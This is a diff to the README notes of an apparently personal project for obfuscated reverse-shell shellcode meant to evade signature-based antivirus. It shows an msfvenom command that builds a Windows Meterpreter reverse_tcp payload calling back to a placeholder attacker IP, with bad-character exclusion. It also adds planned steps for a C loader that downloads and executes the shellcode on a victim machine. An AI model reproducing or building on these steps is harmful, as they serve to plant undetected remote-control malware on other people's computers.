@@ -1,6 +1,11 @@
 # reverse-shell
 Obfuscated reverse-shell shellcode aimed to bypass signature-based antivirus
 
+# 10/16/2024
+  Steps needed in the c program:
+      - Download shellcode payload
+      - parse shellcode properly (
+
 
   # 10/15/2024
   To-do: create a c program to download the shellcode and execute it. 
@@ -20,7 +25,7 @@ Obfuscated reverse-shell shellcode aimed to bypass signature-based antivirus
 
   To create a payload (using kali):
             
-      $msfvenom -p windows/meterpreter/reverse_tcp lhost={IP of attacker} lport={port #} --format c -o payload-22.c -b "\x00\x0A\x0"
+      $msfvenom -p windows/meterpreter/reverse_tcp lhost={IP of attacker} lport={port #} --format c -o payload-22.c -b "\x00\x0A\x0\x0C\x0D"
       
   To download the shellcode as a victim via web server:
     
